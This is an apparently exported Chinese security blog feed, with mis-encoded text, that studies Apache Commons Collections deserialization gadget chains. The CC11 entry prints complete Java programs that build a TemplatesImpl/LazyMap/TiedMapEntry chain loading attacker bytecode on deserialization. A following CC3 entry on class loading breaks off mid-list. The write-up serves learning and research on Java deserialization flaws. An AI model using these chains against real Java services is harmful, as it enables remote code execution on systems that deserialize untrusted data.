<p><a href="https://drun1baby.top/2022/06/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8705-CC2%E9%93%BE/">Javaååºåˆ—åŒ–Commons-Collectionsç¯‡05-CC2é“¾</a></p>
]]></content>
      <categories>
        <category>JAVA</category>
      </categories>
      <tags>
        <tag>JAVAå®‰å…¨</tag>
      </tags>
  </entry>
  <entry>
    <title>Javaååºåˆ—åŒ–CommonsCollectionsç¯‡-CC11</title>
    <url>/2024/06/05/JAVA%E5%AE%89%E5%85%A8/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CC11/</url>
    <content><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>ä¹‹å‰åœ¨å­¦ä¹ CC2çš„æ—¶å€™ï¼ŒCC2æ˜¯CC3+CC4æ”¹å†™çš„ã€‚</p>
<p>ä»å›¾ä¸­å°±å¯ä»¥çœ‹å‡ºæ¥ï¼ŒCC6ä¹Ÿèƒ½èµ°åˆ°TemplatesImplï¼Œç„¶åç›´æ¥åŠ è½½å­—èŠ‚ç ã€‚</p>
<p>CC2+CC6æ”¹å†™ï¼Œå°±æ˜¯CC11</p>
<p><img src="https://image.sp4rks.xyz/2024/06/CC2.png" alt="CC2"></p>
<h2 id="CC11åˆ©ç”¨é“¾"><a href="#CC11åˆ©ç”¨é“¾" class="headerlink" title="CC11åˆ©ç”¨é“¾"></a>CC11åˆ©ç”¨é“¾</h2><p>ä¹‹å‰åœ¨<a href="https://sp4rks3.github.io/2024/05/27/JAVA%E5%AE%89%E5%85%A8/CC3/">Javaååºåˆ—åŒ–CommonsCollectionsç¯‡-CC3</a>ä¸­æåˆ°åˆ©ç”¨<code>ClassLoader#defineClass</code>ç›´æ¥åŠ è½½å­—èŠ‚ç çš„æ–¹å¼ï¼Œåœ¨è¿™é‡Œå¯ä»¥ç›´æ¥ä½¿ç”¨ã€‚</p>
<p>å…¶å®è¿™æ ·çš„è¯ï¼Œç›´æ¥ä½¿ç”¨CC2åŠ è½½æ¶æ„å­—èŠ‚ç çš„éƒ¨åˆ†ç»“åˆCC6å‰é¢è°ƒç”¨çš„éƒ¨åˆ†å°±å¯ä»¥ç»„æˆè¿™æ¡é“¾ã€‚</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>		<br>        <br>        <span class="hljs-comment">//TemplatesImplåŠ è½½æ¶æ„å­—èŠ‚ç </span><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">tc</span> <span class="hljs-operator">=</span> templates.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        nameField.setAccessible(<span class="hljs-literal">true</span>);<br>        nameField.set(templates, <span class="hljs-string">&quot;test&quot;</span>);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodesField.setAccessible(<span class="hljs-literal">true</span>);<br><br>        <span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;C://Users//14341//Desktop/Test.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes = &#123;code&#125;;<br>        bytecodesField.set(templates, codes);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">tfactoryField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        tfactoryField.setAccessible(<span class="hljs-literal">true</span>);<br>        tfactoryField.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>		<span class="hljs-comment">//templates.newTransformer();</span><br>		<br>        <span class="hljs-comment">//é€šè¿‡ChainedTransformeråŠ è½½templatesçš„newTransformeræ–¹æ³•</span><br>        <span class="hljs-comment">//CC6</span><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(templates),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;newTransformer&quot;</span>, <span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>)&#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br><br>        HashMap&lt;Object, Object&gt; hashmap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        Map&lt;Object, Object&gt; lazymap = LazyMap.decorate(hashmap, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>));<br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazymap, <span class="hljs-string">&quot;v&quot;</span>);<br>        HashMap&lt;Object, Object&gt; map2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        map2.put(tiedMapEntry, <span class="hljs-string">&quot;v&quot;</span>);<br>		lazymap.remove(<span class="hljs-string">&quot;v&quot;</span>);<br><br>        Class&lt;LazyMap&gt; c = LazyMap.class;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">factoryField</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;factory&quot;</span>);<br>        factoryField.setAccessible(<span class="hljs-literal">true</span>);<br>        factoryField.set(lazymap,chainedTransformer);<br><br>        serialize(map2);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oss</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oss.writeObject(obj);<br><br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>è¿™æ¡é“¾æœ€ç»ˆä¹Ÿæ˜¯å¯ä»¥æ”¹å†™æˆä¸å¸¦ Transformer æ•°ç»„çš„é“¾ã€‚</p>
<h2 id="æœ€ç»ˆæˆå‹çš„CC11"><a href="#æœ€ç»ˆæˆå‹çš„CC11" class="headerlink" title="æœ€ç»ˆæˆå‹çš„CC11"></a>æœ€ç»ˆæˆå‹çš„CC11</h2><p>è¿™ä¸ª <code>LazyMap#get</code> çš„å‚æ•° keyï¼Œä¼šè¢«ä¼ è¿›<code>transform()</code>ï¼Œå®é™…ä¸Šå®ƒå¯ä»¥æ‰®æ¼” ConstantTransformer çš„è§’è‰²â€”â€”ä¸€ä¸ªç®€å•çš„å¯¹è±¡ä¼ é€’è€…ã€‚</p>
<p>æˆ‘ä»¬ <code>LazyMap.get(key)</code> ç›´æ¥è°ƒç”¨ <code>InvokerTransfomer.transform(key)</code>ï¼Œç„¶ååƒCC2é‚£æ ·è°ƒç”¨ <code>TempalteImpl.newTransformer()</code> æ¥å®Œæˆåç»­è°ƒç”¨ã€‚</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-comment">//TemplatesImplåŠ è½½æ¶æ„å­—èŠ‚ç </span><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">tc</span> <span class="hljs-operator">=</span> templates.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        nameField.setAccessible(<span class="hljs-literal">true</span>);<br>        nameField.set(templates, <span class="hljs-string">&quot;test&quot;</span>);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodesField.setAccessible(<span class="hljs-literal">true</span>);<br><br>        <span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;C://Users//14341//Desktop/Test.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes = &#123;code&#125;;<br>        bytecodesField.set(templates, codes);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">tfactoryField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        tfactoryField.setAccessible(<span class="hljs-literal">true</span>);<br>        tfactoryField.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><span class="hljs-comment">//        templates.newTransformer();</span><br>		<br>		<br>        <span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">invokerTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;newTransformer&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;&#125;);<br><br>        HashMap&lt;Object, Object&gt; hashmap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        Map&lt;Object, Object&gt; lazymap = LazyMap.decorate(hashmap, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>));<br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazymap, templates);<br>        HashMap&lt;Object, Object&gt; map2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        map2.put(tiedMapEntry, <span class="hljs-string">&quot;v&quot;</span>);<br>        lazymap.remove(<span class="hljs-string">&quot;v&quot;</span>);  <span class="hljs-comment">//æ³¨æ„è¿™é‡Œæœ‰å‘</span><br><br><br>        Class&lt;LazyMap&gt; c = LazyMap.class;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">declaredField</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;factory&quot;</span>);<br>        declaredField.setAccessible(<span class="hljs-literal">true</span>);<br>        declaredField.set(lazymap, invokerTransformer);<br><br><br>        serialize(map2);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br><br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oss</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oss.writeObject(obj);<br><br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>



<h3 id="è¸©å‘è®°å½•"><a href="#è¸©å‘è®°å½•" class="headerlink" title="è¸©å‘è®°å½•"></a>è¸©å‘è®°å½•</h3><p>å½“æ—¶è¿è¡Œè¿™æ®µä»£ç ï¼Œå¯ä»¥è¿è¡Œï¼Œä¹Ÿæ²¡æŠ¥é”™ï¼Œä½†æ˜¯è®¡ç®—æœºå¹¶ä¸èƒ½å¼¹å‡ºæ¥ï¼Œå¤§ä½“æµè§ˆäº†ä¸€è¾¹ä»£ç æ„Ÿè§‰æ²¡é—®é¢˜ã€‚å½“æ—¶å¡åœ¨è¿™é‡Œå¥½ä¹…ï¼Œåªèƒ½æ…¢æ…¢è°ƒè¯•ã€‚</p>
<p>ç›´æ¥åœ¨<code>TemplatesImpl</code>åŠ è½½æ¶æ„å­—èŠ‚ç çš„éƒ¨åˆ†å°è¯•<code>templates.newTransformer()</code>ï¼Œé¦–å…ˆç¡®å®šäº†<code>TemplatesImpl</code>åŠ è½½æ¶æ„å­—èŠ‚ç æ˜¯èƒ½å¤Ÿè§¦å‘çš„ï¼Œé‚£è¿™éƒ¨åˆ†æ²¡æœ‰é—®é¢˜</p>
<p><code>InvokerTransformer</code>è°ƒç”¨çš„éƒ¨åˆ†æˆ‘æƒ³åº”è¯¥æ²¡æœ‰é—®é¢˜ï¼Œé‚£æœ€æœ‰å¯èƒ½æœ‰é—®é¢˜çš„å…¶å®æ˜¯<code>Lazymap</code>ï¼Œçœ‹äº†æœ€ä¸Šé¢çš„å›¾ï¼Œçœ‹åˆ°æ˜¯è°ƒç”¨äº†LazyMap.get()ï¼Œç›´æ¥ä¸‹æ–­ç‚¹è°ƒè¯•</p>
<p>å…¶å®å’Œä¹‹å‰CC6çš„æƒ…å†µæ˜¯ä¸€æ ·çš„ï¼Œå½“LazyMapæ²¡keyçš„æ—¶å€™æ‰ä¼šè°ƒç”¨<code>put()</code>ï¼Œä½†æ˜¯ç°åœ¨çš„keyä¸º<code>templates</code>ï¼Œç»“æœä¸º<code>map.containsKey(key) == true</code>å¯¼è‡´æ¡ä»¶åˆ¤æ–­å¤±è´¥ã€‚</p>
<p>è§£å†³åŠæ³•ä¹Ÿå¾ˆç®€å•ç›´æ¥<code>lazymap.clear();</code>æˆ–è€…<code>lazymap.remove(&quot;templates&quot;);</code></p>
<p>(ç²—å¿ƒå¤§æ„å¯¼è‡´æµªè´¹äº†å¾ˆå¤šæ—¶é—´)ã€‚</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240605205214090.png" alt="image-20240605205214090"></p>
<h3 id="æœ€ç»ˆé“¾å­"><a href="#æœ€ç»ˆé“¾å­" class="headerlink" title="æœ€ç»ˆé“¾å­"></a>æœ€ç»ˆé“¾å­</h3><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-comment">//TemplatesImplåŠ è½½æ¶æ„å­—èŠ‚ç </span><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">tc</span> <span class="hljs-operator">=</span> templates.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        nameField.setAccessible(<span class="hljs-literal">true</span>);<br>        nameField.set(templates, <span class="hljs-string">&quot;test&quot;</span>);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodesField.setAccessible(<span class="hljs-literal">true</span>);<br><br>        <span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;C://Users//14341//Desktop/Test.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes = &#123;code&#125;;<br>        bytecodesField.set(templates, codes);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">tfactoryField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        tfactoryField.setAccessible(<span class="hljs-literal">true</span>);<br>        tfactoryField.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><span class="hljs-comment">//        templates.newTransformer();</span><br><br>        <span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">invokerTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;newTransformer&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;&#125;);<br><br>        HashMap&lt;Object, Object&gt; hashmap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        Map&lt;Object, Object&gt; lazymap = LazyMap.decorate(hashmap, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>));<br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazymap, templates);<br>        HashMap&lt;Object, Object&gt; map2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        map2.put(tiedMapEntry, <span class="hljs-string">&quot;v&quot;</span>);<br>        lazymap.remove(templates);<br>        <br><br>        Class&lt;LazyMap&gt; c = LazyMap.class;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">declaredField</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;factory&quot;</span>);<br>        declaredField.setAccessible(<span class="hljs-literal">true</span>);<br>        declaredField.set(lazymap, invokerTransformer);<br>        <br><br>        serialize(map2);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oss</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oss.writeObject(obj);<br><br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>



<h2 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h2><p><a href="https://github.com/dota-st/JavaSec/blob/master/03-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%93%E5%8C%BA/9-CommonsCollections11/CommonsCollections11.md">CommonsCollections11åˆ©ç”¨é“¾åˆ†æ</a></p>
<p><a href="https://drun1baby.top/2022/07/11/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8709-CC11%E9%93%BE/#5-%E6%9C%80%E7%BB%88%E4%B8%8D%E5%B8%A6-Transformer-%E6%95%B0%E7%BB%84%E7%9A%84-CC11-%E9%93%BE%E5%AD%90">Javaååºåˆ—åŒ–Commons-Collectionsç¯‡09-CC11é“¾</a></p>
]]></content>
      <categories>
        <category>JAVA</category>
      </categories>
      <tags>
        <tag>JAVAå®‰å…¨</tag>
      </tags>
  </entry>
  <entry>
    <title>Javaååºåˆ—åŒ–CommonsCollectionsç¯‡-CC3</title>
    <url>/2024/05/27/JAVA%E5%AE%89%E5%85%A8/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CC3/</url>
    <content><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>CC1å’ŒCC2éƒ½æ˜¯é€šè¿‡ååºåˆ—åŒ–è‡ªåŠ¨æ‰§è¡Œäº†object()æ–¹æ³•æœ€ç»ˆå¯¼è‡´äº†<code>InvokerTransformer.transform(Method.invoke())</code>çš„å‘½ä»¤æ‰§è¡Œï¼Œé‚£æœ‰æ²¡æœ‰ä¸€ç§å¯èƒ½ï¼Œä¸é€šè¿‡<code>InvokerTransformer.transform(Method.invoke())</code>æ¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œï¼ŸCC3ç»™å‡ºäº†ç­”æ¡ˆï¼ŒCC3æ˜¯é€šè¿‡JAVAçš„åŠ¨æ€ç±»åŠ è½½æœºåˆ¶æ¥è‡ªåŠ¨æ‰§è¡Œæ¶æ„ç±»ä»£ç ã€‚</p>
<h2 id="ç¯å¢ƒé…ç½®"><a href="#ç¯å¢ƒé…ç½®" class="headerlink" title="ç¯å¢ƒé…ç½®"></a>ç¯å¢ƒé…ç½®</h2><ul>
<li><p>JDK8u65</p>
</li>
<li><p>Commons-Collections 3.2.1</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java">&lt;dependencies&gt;<br>  <br>     &lt;dependency&gt;<br>         &lt;groupId&gt;commons-collections&lt;/groupId&gt;<br>         &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;<br>         &lt;version&gt;<span class="hljs-number">3.2</span><span class="hljs-number">.1</span>&lt;/version&gt;<br>     &lt;/dependency&gt;<br>  <br> &lt;/dependencies&gt;<br></code></pre></td></tr></table></figure></li>
</ul>
<h2 id="JAVAåŠ¨æ€ç±»åŠ è½½"><a href="#JAVAåŠ¨æ€ç±»åŠ è½½" class="headerlink" title="JAVAåŠ¨æ€ç±»åŠ è½½"></a>JAVAåŠ¨æ€ç±»åŠ è½½</h2><h3 id="åˆ©ç”¨URLClassLoaderåŠ è½½classæ–‡ä»¶"><a href="#åˆ©ç”¨URLClassLoaderåŠ è½½classæ–‡ä»¶" class="headerlink" title="åˆ©ç”¨URLClassLoaderåŠ è½½classæ–‡ä»¶"></a>åˆ©ç”¨URLClassLoaderåŠ è½½classæ–‡ä»¶</h3><p>Javaçš„<code>ClassLoader</code>æ¥ç”¨æ¥åŠ è½½å­—èŠ‚ç æ–‡ä»¶æœ€åŸºç¡€çš„æ–¹æ³•ï¼Œ<code>ClassLoader </code>æ˜¯ä»€ä¹ˆå‘¢ï¼Ÿå®ƒå°±æ˜¯ä¸€ä¸ªâ€œåŠ è½½å™¨â€ï¼Œå‘Šè¯‰Javaè™šæ‹Ÿæœºå¦‚ä½•åŠ è½½è¿™ä¸ªç±»ã€‚Javaé»˜è®¤çš„<code> ClassLoader</code> å°±æ˜¯æ ¹æ®ç±»åæ¥åŠ è½½ç±»ï¼Œè¿™ä¸ªç±»åæ˜¯ç±»å®Œæ•´è·¯å¾„ï¼Œå¦‚<code>java.lang.Runtime</code>ã€‚</p>
<p><code>URLClassLoader</code> ç»§æ‰¿äº†<code>ClassLoader</code>ä¹Ÿå°±æ˜¯è¯´<code>URLClassLoader</code>æŠŠ<code>ClassLoader</code>æ‰©å±•äº†ä¸€ä¸‹ï¼Œæ‰€ä»¥å¯ä»¥ç†è§£æˆ<code>URLClassLoader</code>åŠŸèƒ½è¦å¤šç‚¹ã€‚<code>URLClassLoader</code> å®é™…ä¸Šæ˜¯æˆ‘ä»¬å¹³æ—¶é»˜è®¤ä½¿ç”¨çš„ <code>AppClassLoader </code>çš„çˆ¶ç±»ï¼Œæ‰€ä»¥ï¼Œæˆ‘ä»¬è§£é‡Š <code>URLClassLoader </code>çš„å·¥ä½œè¿‡ç¨‹å®é™…ä¸Šå°±æ˜¯åœ¨è§£é‡Šé»˜è®¤çš„Javaç±»åŠ è½½å™¨çš„å·¥ä½œæµç¨‹ã€‚ </p>
<p>æ­£å¸¸æƒ…å†µä¸‹ï¼ŒJavaä¼šæ ¹æ®é…ç½®é¡¹ <code>sun.boot.class.path </code>å’Œ<code>java.class.path</code>ä¸­åˆ—ä¸¾åˆ°çš„åŸºç¡€è·¯å¾„ï¼ˆè¿™äº›è·¯å¾„æ˜¯ç»è¿‡å¤„ç†åçš„ java.net.URL ç±»ï¼‰æ¥å¯»æ‰¾.classæ–‡ä»¶æ¥åŠ è½½ï¼Œè€Œè¿™ä¸ªåŸºç¡€è·¯å¾„æœ‰åˆ†ä¸ºä¸‰ç§æƒ…å†µï¼š</p>
<ul>
<li><p>URLæœªä»¥æ–œæ  &#x2F; ç»“å°¾ï¼Œåˆ™è®¤ä¸ºæ˜¯ä¸€ä¸ªJARæ–‡ä»¶ï¼Œä½¿ç”¨ <code>JarLoader </code>æ¥å¯»æ‰¾ç±»ï¼Œå³ä¸ºåœ¨JaråŒ…ä¸­å¯» æ‰¾.classæ–‡ä»¶ã€‚</p>
</li>
<li><p>URLä»¥æ–œæ  &#x2F; ç»“å°¾ï¼Œä¸”åè®®åæ˜¯ file ï¼Œåˆ™ä½¿ç”¨ <code>FileLoader </code>æ¥å¯»æ‰¾ç±»ï¼Œå³ä¸ºåœ¨æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿä¸­å¯» æ‰¾.classæ–‡ä»¶ ã€‚</p>
</li>
